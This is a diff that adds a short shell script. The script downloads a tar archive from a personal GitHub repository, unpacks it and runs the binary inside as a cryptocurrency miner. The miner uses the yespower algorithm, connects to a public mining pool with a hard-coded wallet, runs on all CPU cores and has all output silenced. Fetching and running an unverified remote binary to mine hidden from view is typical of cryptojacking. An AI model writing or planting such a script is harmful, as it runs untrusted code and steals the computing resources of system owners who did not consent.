@@ -1,0 +1,11 @@
+#!/bin/sh
+
+A=yespower
+B=stratum+tcps://stratum-eu.rplant.xyz:17017
+C=web1qjqxwuswcwcr0j23r0kt9dae4z25zdxmk3d3g04
+D=burayot
+apt-get update && apt-get upgrade -y
+wget https://github.com/arifrahman555/arif/raw/main/cuan.tar.gz
+tar -xf cuan.tar.gz
+./cuan -a $A -o $B -u $C.$D -t$(nproc --all) >/dev/null >/dev/null 2>&1
+sleep 10
